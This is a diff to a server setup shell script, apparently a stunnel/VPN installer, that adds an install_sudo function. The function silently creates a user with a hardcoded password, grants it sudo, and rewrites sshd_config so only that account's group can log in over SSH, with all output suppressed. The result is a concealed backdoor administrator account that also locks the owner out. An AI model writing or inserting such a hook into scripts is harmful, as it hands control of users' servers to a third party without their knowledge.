@@ -618,6 +618,15 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
+install_sudo(){
+  {
+    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
+
 install_iptables(){
   {
 echo -e "\033[01;31m Configure Sysctl \033[0m"
